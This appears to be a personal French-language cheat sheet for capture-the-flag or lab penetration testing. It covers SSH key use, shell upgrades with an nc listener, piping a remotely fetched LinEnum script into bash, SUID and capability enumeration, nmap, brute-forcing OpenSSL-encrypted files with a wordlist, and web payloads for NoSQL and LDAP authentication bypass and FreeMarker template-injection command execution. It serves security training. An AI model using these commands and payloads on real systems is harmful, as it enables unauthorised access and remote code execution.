@@ -1,0 +1,93 @@
+------------------------BASH--------------------------------
+--noprofile
+	Do  not  read  either  the system-wide startup file /etc/profile or any of the personal
+        initialization files ~/.bash_profile, ~/.bash_login, or ~/.profile.  By  default,  bash
+             reads these files when it is invoked as a login shell (see INVOCATION below).
+--norc Do  not  read  and execute the system wide initialization file /etc/bash.bashrc and the
+        personal initialization file ~/.bashrc if the shell is interactive.  This option is  on 
+	by default if the shell is invoked as sh.
+
+-------------------------SSH----------------------------------
+
+ssh private key 
+	/USER/.ssh/id_rsnca
+	chmod 600 le fichier
+	ssh user@ip -i private_key
+
+
+------------------------PRIVESC--------------------------------
+
+
+ReverseShell : https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+trouver une version de python 
+which python
+
+Get a TTY
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+export TERM=screen
+
+ctrl + z 
+stty raw -echo
+nc -lvnp $PORT(retour au shell)
+
+créer un mini server pour récupérer ses fichiers
+python -m SimpleHTTPServer 
+
+curl un fichier 
+curl 10.10.14.249:9999/LinEnum.sh | bash
+
+wget un fichier 
+wget -O LinEnum.sh 10.10.14.249:9999
+
+utiliser ps aux permet de lister les processus actifs
+ps aux
+
+utiliser getcap pour voir les capabilitée des binaires 
+getcap -r / 2>/dev/null
+
+file donne des infos sur le fichier (encryptage)
+file fichierAAnalyser
+
+trouver les SUID
+find / -perm -4000 -exec ls -l {} \; 2>/dev/null
+
+lancer un bash sans profile prédefini (bashrc ...)
+ssh -i /home/nobody/.ssh/ssh_key USER@IP -t bash --noprofile --norc
+
+Doc privesc 
+https://www.certsi.es/en/blog/linux-capabilities-en
+
+--------------------------FTP---------------------------------
+
+Par default ftp autorise l'acces a "anonymous" sans mot de passe
+
+
+--------------------------NMAP---------------------------------
+
+nmap -sC -sV -oA name ip_box
+
+
+--------------------------CRYPTO------------------------------
+
+cat file | 
+
+Decoder openssl -salted 
+bruteforce-salted-openssl -t 6 -f ~/Téléchargements/rockyou.txt -c AES-256-CBC -d SHA256 decoded_drupal.txt -1
+
+Encoder en openssl
+openssl enc -in LEFICHIERDENTREE -out LEFICHIERDESORTIE -d -AES-256-CBC -md sha256 -pass 'pass:LEPASSQUETATROUVE'
+--------------------------DIVERS------------------------------
+
+var globales :: site.com/page.php?password=pass&_SESSION["logged"]=array("1")
+LDAP injection tester username avec ) si error username=* pass=*)(& 
+
+nosql
+NOSQL usr_name[$ne]=h4cker&usr_password[$ne]=abc [$ne] == OK
+NOSQL usr_name[$regex]=.{1}&usr_password[$ne]=abc a utiliser regex jusqu'a la bonne taille puis insérer les caracteres avant le . qui veut dire "tout"
+
+template injection 
+https://portswigger.net/blog/server-side-template-injection 
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
